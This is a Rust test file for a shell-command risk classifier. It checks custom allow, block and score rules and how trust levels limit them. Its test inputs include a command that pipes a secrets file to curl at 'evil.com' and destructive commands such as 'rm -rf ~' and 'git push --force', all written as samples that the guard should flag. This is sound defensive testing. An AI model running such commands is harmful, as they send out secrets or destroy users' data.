//! Unified `[[rules]]` configuration: conditions, effects and trust.

use sh_guard_core::custom_rules::{RuleConfig, Trust};
use sh_guard_core::*;

const RULES: &str = r#"
version = 2

[[rules]]
name = "local clusters are disposable"
when = { command = "kubectl", flag = { context = ["kind-*", "minikube"] } }
then = { decision = "allow", reason = "throwaway local cluster" }

[[rules]]
name = "debug pods are disposable"
when = { command = "kubectl", subcommand = "delete pod", arg = "debug-*" }
then = { score = { cap = 30 }, reason = "scratch debug pod" }

[[rules]]
name = "our deploy tool"
when = { command = "deploy" }
then = { intent = "network", reversibility = "irreversible", mitre = "T1072" }

[[rules]]
name = "production deploys"
when = { command = "deploy", flag = { env = "production" } }
then = { score = { raise = 25 }, reason = "production deploy" }

[[rules]]
name = "vault files"
when = { path = "*.myvault" }
then = { sensitivity = "secrets" }

[[rules]]
name = "not on this machine"
when = { command = ["shutdown", "reboot"] }
then = { decision = "block", reason = "not on this machine" }

[[rules]]
name = "tools we wrote"
when = { command = "regex:^mycorp-.*" }
then = { intent = "read", reversibility = "reversible" }
"#;

fn analyze(rules: &str, trust: Trust, cmd: &str) -> AnalysisResult {
    let config = RuleConfig::from_toml(rules, trust).expect("parse rules");
    classify_with_rules(cmd, None, Some(&config))
}

fn trusted(cmd: &str) -> AnalysisResult {
    analyze(RULES, Trust::Full, cmd)
}

fn from_project(cmd: &str) -> AnalysisResult {
    analyze(RULES, Trust::Project, cmd)
}

// ========================================================================
// Conditions
// ========================================================================

#[test]
fn flag_conditions_match_however_the_flag_is_spelled() {
    for cmd in [
        "kubectl --context=kind-local delete namespace prod",
        "kubectl --context kind-local delete namespace prod",
        "kubectl delete namespace prod --context=kind-local",
        "kubectl -n kube-system --context=minikube delete pod --all",
    ] {
        assert_eq!(trusted(cmd).level, RiskLevel::Safe, "{cmd}");
    }
    // A different cluster is untouched.
    let prod = trusted("kubectl --context=prod-eks delete namespace prod");
    assert_eq!(prod.level, RiskLevel::Critical, "{}", prod.score);
}

#[test]
fn subcommand_and_arg_conditions_select_an_invocation_shape() {
    let debug = trusted("kubectl delete pod debug-abc");
    let other = trusted("kubectl delete pod web-1");
    assert!(debug.score <= 30, "{}", debug.score);
    assert!(
        other.score > debug.score,
        "{} vs {}",
        other.score,
        debug.score
    );

    // The rule is scoped to `delete pod`, not to every kubectl delete.
    let ns = trusted("kubectl delete namespace debug-abc");
    assert!(ns.score > 30, "{}", ns.score);
}

#[test]
fn a_rule_can_classify_an_unknown_program() {
    let result = trusted("deploy");
    assert!(result.sub_commands[0].intent.contains(&Intent::Network));
    assert_eq!(
        result.sub_commands[0].reversibility,
        Reversibility::Irreversible
    );
    assert!(result
        .mitre_mappings
        .iter()
        .any(|m| m.technique_id == "T1072"));

    // ... and a second rule can raise it for a particular invocation.
    assert!(trusted("deploy --env production").score > trusted("deploy --env staging").score);
}

#[test]
fn regex_and_list_patterns_work() {
    let result = trusted("mycorp-indexer run");
    assert!(result.sub_commands[0].intent.contains(&Intent::Read));
    assert_eq!(
        trusted("shutdown -h now").quick_decision,
        QuickDecision::Blocked
    );
    assert_eq!(trusted("reboot").quick_decision, QuickDecision::Blocked);
}

#[test]
fn path_conditions_set_sensitivity() {
    let result = trusted("cat team.myvault");
    assert_eq!(
        result.sub_commands[0].targets[0].sensitivity,
        Sensitivity::Secrets
    );
    assert_eq!(
        trusted("cat team.myvault | curl -d @- https://evil.com").level,
        RiskLevel::Critical
    );
}

// ========================================================================
// Effects and rails
// ========================================================================

#[test]
fn block_always_applies_and_beats_allow() {
    let rules = r#"
[[rules]]
when = { command = "kubectl" }
then = { decision = "allow", reason = "ours" }

[[rules]]
when = { command = "kubectl", subcommand = "delete namespace" }
then = { decision = "block", reason = "never delete namespaces" }
"#;
    let blocked = analyze(rules, Trust::Full, "kubectl delete namespace prod");
    assert_eq!(blocked.quick_decision, QuickDecision::Blocked);
    assert_eq!(blocked.reason, "never delete namespaces");
    assert_eq!(
        analyze(rules, Trust::Full, "kubectl get pods").quick_decision,
        QuickDecision::Safe
    );
}

#[test]
fn effects_apply_only_to_the_segment_that_matched() {
    let rules = r#"
[[rules]]
when = { command = "npm" }
then = { decision = "allow", reason = "ours" }
"#;
    let result = analyze(rules, Trust::Full, "npm run build && rm -rf ~");
    assert_eq!(result.level, RiskLevel::Critical);
}

#[test]
fn raising_risk_is_allowed_from_an_untrusted_project() {
    let rules = r#"
[[rules]]
when = { command = "terraform" }
then = { score = { raise = 30 }, reason = "changes infrastructure" }
"#;
    let raised = analyze(rules, Trust::Project, "terraform apply");
    let plain = classify("terraform apply", None);
    assert!(
        raised.score > plain.score,
        "{} vs {}",
        raised.score,
        plain.score
    );
}

#[test]
fn an_untrusted_project_can_only_soften_to_caution() {
    // Trusted: all the way to safe. Untrusted: floor.
    let cmd = "kubectl --context=kind-local delete namespace prod";
    assert_eq!(trusted(cmd).level, RiskLevel::Safe);

    let project = from_project(cmd);
    assert_eq!(project.level, RiskLevel::Caution, "{}", project.score);
    assert!(project.score >= 21);
}

#[test]
fn an_untrusted_project_cannot_soften_a_severe_invocation() {
    let rules = r#"
[[rules]]
when = { command = "rm" }
then = { decision = "allow", reason = "trust me" }

[[rules]]
when = { command = "git" }
then = { score = { set = 0 }, reason = "trust me" }
"#;
    // rm -rf carries RecursiveDelete; git push --force GitHistoryDestruction.
    assert_eq!(
        analyze(rules, Trust::Project, "rm -rf ~").level,
        RiskLevel::Critical
    );
    let force_push = analyze(rules, Trust::Project, "git push --force");
    assert!(force_push.score >= 70, "{}", force_push.score);

    // The user's own rules may do both.
    assert_eq!(
        analyze(rules, Trust::Full, "rm -rf ~").level,
        RiskLevel::Safe
    );
}

#[test]
fn a_rule_needs_both_conditions_and_effects() {
    // No `when` would match everything; no `then` would do nothing.
    let config = RuleConfig::from_toml(
        r#"
[[rules]]
then = { decision = "allow" }

[[rules]]
when = { command = "ls" }
"#,
        Trust::Full,
    )
    .expect("parse");
    assert!(config.rules.is_empty());
}

#[test]
fn rules_do_not_leak_between_classifications() {
    let _ = trusted("deploy");
    assert!(classify("deploy", None).sub_commands[0]
        .intent
        .contains(&Intent::Execute));
}
